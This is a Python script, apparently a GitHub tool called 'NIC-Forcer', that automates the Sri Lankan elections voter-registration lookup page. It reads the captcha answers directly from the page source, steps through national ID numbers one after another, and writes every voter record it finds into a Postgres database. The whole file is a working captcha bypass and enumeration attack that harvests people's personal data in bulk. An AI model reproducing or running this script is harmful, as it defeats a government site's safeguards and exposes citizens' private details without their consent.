#  HiMasH  
#  https://github.com/himash/NIC-Forcer

from selenium import webdriver
from bs4 import BeautifulSoup
import time
import codecs
import os
import psycopg2
from urlparse import urlparse


url = urlparse(os.environ['DATABASE_URL'])
dbname = url.path[1:]
user = url.username
password = url.password
host = url.hostname
port = url.port

con = psycopg2.connect(
    dbname=dbname,
    user=user,
    password=password,
    host=host,
    port=port
        )
cur = con.cursor()
time.sleep(1)

cur.execute("SELECT * FROM details");
datstat = cur.fetchone()
con.commit()
if datstat == None:
    nicno = 942390980
elif datstat is not None:
    cur.execute("SELECT id,nic_details FROM details ORDER BY id DESC LIMIT 1");
    result = cur.fetchall()
    exanic = [x for t in result for x in t]
    exanic2 = int(exanic[1])
    
    nicno = exanic2 + 1 
    con.commit()
    cur.close()
    con.close()

        
browser = webdriver.PhantomJS()
browser.get("http://eservices.elections.gov.lk/myVoterRegistration.aspx") 
time.sleep(3)

limiter = 0

while True:

    try:
            
        url = urlparse(os.environ['DATABASE_URL'])
        dbname = url.path[1:]
        user = url.username
        password = url.password
        host = url.hostname
        port = url.port

        con = psycopg2.connect(
            dbname=dbname,
            user=user,
            password=password,
            host=host,
            port=port
                )
        cur = con.cursor()
        
        browser.get("http://eservices.elections.gov.lk/myVoterRegistration.aspx") 
        time.sleep(3)


        for i in range(1,50000):
            page = browser.page_source
            bs = BeautifulSoup(page,"lxml")
            catcha1 = bs.find_all(id='ContentPlaceHolder1_imbC1')
            catcha2 = bs.find_all(id='ContentPlaceHolder1_imbC2')
            catcha3 = bs.find_all(id='ContentPlaceHolder1_imbC3')
            catcha4 = bs.find_all(id='ContentPlaceHolder1_imbC4')
            catcha5 = bs.find_all(id='ContentPlaceHolder1_imbC5')
            capcon1 = str(catcha1)
            capcon2 = str(catcha2)
            capcon3 = str(catcha3)
            capcon4 = str(catcha4)
            capcon5 = str(catcha5)

            code = capcon1[96] , capcon2[96], capcon3[96], capcon4[96], capcon5[96]

            username = browser.find_element_by_id("ContentPlaceHolder1_txtNIC")
            browser.find_element_by_id("ContentPlaceHolder1_txtNIC").clear()
            browser.find_element_by_id("ContentPlaceHolder1_txtCode").clear()
            codenum =  browser.find_element_by_id("ContentPlaceHolder1_txtCode")

            nicno2 = str(nicno) + str("v")
            

            username.send_keys(nicno2)
            time.sleep(1)
            codenum.send_keys(code)
            signInButton = browser.find_element_by_id('ContentPlaceHolder1_cmdDisplay')
            signInButton.click()
            time.sleep(3)

            page = browser.page_source
            bs = BeautifulSoup(page,"lxml")

            wi = bs.find("span",id ="ContentPlaceHolder1_lblWarning" )
            wi2 = wi.text

            if len(wi2) > 2:
                
                nicno = nicno + 1
                limiter = limiter + 1
                
                if limiter > 100:
                    exlimit = nicno % 10000
                    reachdis = 10000 - exlimit
                    nicno = nicno + reachdis
                    limiter = 0


            else:
                details = bs.find(id='ContentPlaceHolder1_DetailsView')
                table_rows = details.find_all('tr')

                for tr in table_rows:
                    
                    td = tr.find_all('td')
                    row = [i.text for i in td]
                    str1 = ''.join(row)
                    
                    
                    cur.execute("INSERT INTO details(nic_details) VALUES (%s)",(str1,));
                    con.commit()
                cur.execute("INSERT INTO details(nic_details) VALUES (%s)",(nicno,));
                con.commit()
                limiter = 0 
                nicno = nicno + 8

    except:
        print"error"
        time.sleep(5)
        pass
